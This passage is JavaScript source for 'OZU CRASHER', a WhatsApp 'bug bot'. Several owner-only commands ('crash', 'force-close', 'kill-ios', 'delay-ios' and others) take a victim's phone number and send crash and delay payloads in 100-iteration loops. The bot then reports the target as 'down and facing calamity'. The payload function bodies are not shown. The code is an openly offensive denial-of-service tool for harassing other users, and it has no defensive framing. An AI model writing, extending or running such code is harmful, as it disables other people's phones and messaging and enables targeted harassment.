                  display_text: "🔙 ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ",
                  id: `${prefix}menu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ɪɴsᴘᴇᴄᴛɴᴜᴍ📱",
                  id: `${prefix}num`
                })
              },
              {              
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ᴘᴏsᴛ ᴛᴏ ɢᴄ sᴛᴀᴛᴜs",
                  id: `${prefix}gcstatus`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "⏱️ Runtime",
                  id: `${prefix}runtime`
                })
              }
            ]
          })
        })
      }
    }
  },
  { quoted: lol }
);

await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case "groupmenu": {

let menu = `
╭════════════════════╮
        𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
╰════════════════════╯

╭━━━═━═━═━═━═━═━═━═━═━╮
┃ 🤌 𝗛𝗲𝗹𝗹𝗼 *${pushname}*
┃
┃ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗯𝘆 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 👩‍💻
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        ⚙️ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗡𝗮𝗺𝗲       : 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
┃ ⦿ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻    : 2.0
┃ ⦿ 𝗠𝗼𝗱𝗲       : ${stillchasing.public ? "𝗣𝗨𝗕𝗟𝗜𝗖 🌐" : "𝗦𝗘𝗟𝗙 🔒"}
┃ ⦿ 𝗘𝗻𝗴𝗶𝗻𝗲     : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 ⚡
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        📅 𝗦𝗬𝗦𝗧𝗘𝗠
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗗𝗮𝘁𝗲       : ${dateNG}
┃ ⦿ 𝗧𝗶𝗺𝗲       : ${timeNG}
┃ ⦿ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲    : ${runtime(process.uptime())}
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        👨‍💻 𝗖𝗥𝗘𝗔𝗧𝗢𝗥
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿       : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
┃
╰━━━═━═━═━═━═━═━═━═━═━╯


╔═══════════════════╗
║ ⚡ ❮ 𝑮𝒓𝒐𝒖𝒑 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔 ❯ ⚡║
╠═══════════════════╣
║  ▸ ʟɪɴᴋɢʀᴏᴜᴘ
║  ▸ ᴀᴅᴅᴀᴅᴍɪɴ
║  ▸ ʟᴏᴄᴋɢᴄ
║  ▸ ᴛᴀɢᴀʟʟ
║  ▸ ᴋɪᴄᴋ
║  ▸ ᴋɪᴄᴋ-ᴀʟʟ
║  ▸ ᴀᴅᴅ
║  ▸ ɢʀᴏᴜᴘɪɴғᴏ
║  ▸ sᴇᴛɴᴀᴍᴇ
║  ▸ sᴇᴛᴅᴇsᴄ
║  ▸ ʀᴇᴠᴏᴋᴇ
║  ▸ ʜɪᴅᴇᴛᴀɢ
║  ▸ ʟᴇғᴛ
║  ▸ɢᴄsᴛᴀᴛᴜs
║  ▸ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ
╚══════════════════╝
`;
const media = await prepareWAMessageMedia(
  {
    image: fs.readFileSync('./lib/image/ozu1.jpeg')
  },
  { upload: stillchasing.waUploadToServer }
);

let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({

          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363405765816590@newsletter",
              serverMessageId: 1,
              newsletterName: "𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.0 "
            }
          },

          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
          }),

          body: proto.Message.InteractiveMessage.Body.create({
            text: menu
          }),

          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴"
          }),

          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🐞 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                  id: `${prefix}bugmenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "👑 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂",
                  id: `${prefix}ownermenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🔙 ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ",
                  id: `${prefix}menu`
                })
              }
            ]
          })
        })
      }
    }
  },
  { quoted: lol }
);

await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

await stillchasing.sendMessage(
  m.chat,
  {
    audio: fs.readFileSync('./lib/news.mp3'),
    mimetype: 'audio/mpeg',
    ptt: false
  },
  { quoted: lol }
);

}

// ▂▃▄▅▆▇█▓▒ ʙᴜɢ ᴄᴀsᴇs ░  ░▒▓█▇▆▅▄▃▂
// ᴀɴᴅʀᴏɪᴅ ᴄᴀsᴇs
case "crash":
case "trash": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000) // 2.5 seconds delay (you can change this)

// Crash loop
for (let i = 0; i < 100; i++) {
  await stickerCrash(target);
  await stx(target, true);
  await Delay(stillchasing, target);
  await StcSqL(stillcjasing, target);
  await R9X(stillchasing, target, false);
  await sleep(1000)
}

    console.log(chalk.red.bold(`𝗙𝗮𝘀𝘁 𝗕𝘂𝗴 𝗦𝗲𝗻𝗱 𝗧𝗼 ${jidx} 🎯`));
    break;
}
break;
case "invisible":
case "force-close": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000) // 2.5 seconds delay (you can change this)

// Crash loop
for (let i = 0; i < 100; i++) {
  await stickerCrash(target);
  await StcSqL(stillchasing, target);
  await Delay(stillchasing, target);
  await stx(target, true);
  await R9X(stillchasing, target, false);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}
break;
case "delay":
case "delay-hard": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000) // 2.5 seconds delay (you can change this)

// Crash loop
for (let i = 0; i < 100; i++) {
  await DelayVisi(stillchasing, target);
  await Invis(target);
  await stx(target, true);
  await Delay(stillchasing, target);
  await RadiationDelay(target);
  await R9X(stillchasing, target, false);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}
// iOS Bug Cases
break;
case "kill-ios":
case "trash-ios":
case "fc-ios": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000) // 

// Crash loop
for (let i = 0; i < 100; i++) {
  await TrashLocIosX(target, true);
  await stx(target, true);
  await RadiationDelay(target);
  await Delay(stillchasing, target);
  await ExoDelayHours(target, true);
  await sleep(1000)
}

console.log("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯")
}
break;
case "invisible-ios":
case "delay-ios": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000) // 

// Crash loop
for (let i = 0; i < 100; i++) {
  await TrashLocIosX(target, true);
  await stx(target, true);
  await RadiationDelay(target);
  await ExoDelayHours(target, true);
  await Delay(stillchasing, target);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}
// Samsung bug

break;
case "delaying": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000)
// Crash loop
for (let i = 0; i < 100; i++) {
  await DelayVisi(stillchasing, target);
  await ExoDelayHours(target, true);
  await Delay(stillchasing, target);
  await RadiationDelay(target);
  await Invis(target);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}

break;
case "ozu-delay": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
